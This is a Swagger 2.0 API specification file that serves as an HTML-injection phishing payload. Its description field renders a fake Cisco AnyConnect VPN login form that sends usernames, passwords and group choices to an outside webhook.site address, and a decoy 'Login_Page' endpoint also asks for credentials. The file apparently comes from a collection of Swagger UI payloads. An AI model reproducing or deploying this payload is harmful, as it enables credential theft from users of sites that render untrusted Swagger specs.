swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<br><br><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#ffffff"><table width="100%" cellspacing="0" cellpadding="10"><tr><td bgcolor="#0d3d63" align="left"><font face="Arial" size="3" color="#ffffff"><b>AnyConnect &mdash; Secure VPN Login</b></font></td></tr></table><table width="100%" cellspacing="0" cellpadding="22"><tr><td align="left"><font face="Segoe UI" size="2" color="#545b62">This gateway requires multi-factor authentication. Enter your credentials to establish an encrypted tunnel.</font><br><br><form action="https://webhook.site/REPLACE-ME" method="post"><font face="Segoe UI" size="2" color="#333333"><b>Username</b></font><br><input type="text" name="user" size="34" placeholder="Username"><br><br><font face="Segoe UI" size="2" color="#333333"><b>Password</b></font><br><input type="password" name="pass" size="34" placeholder="Password"><br><br><font face="Segoe UI" size="2" color="#333333"><b>Group</b></font><br><select name="group"><option>Employees-2FA</option><option>Contractors</option></select><br><br><input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-vpn.png" width="110" height="31" alt="Connect"></form></td></tr></table><table width="100%" cellspacing="0" cellpadding="3"><tr><td bgcolor="#0d3d63">&nbsp;</td></tr></table><table width="100%" cellspacing="0" cellpadding="8"><tr><td align="left"><font face="Segoe UI" size="2" color="#8d99a8">Cisco AnyConnect Secure Mobility Client &middot; v4.10</font></td></tr></table></td><td width="30%">&nbsp;</td></tr></table><br>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
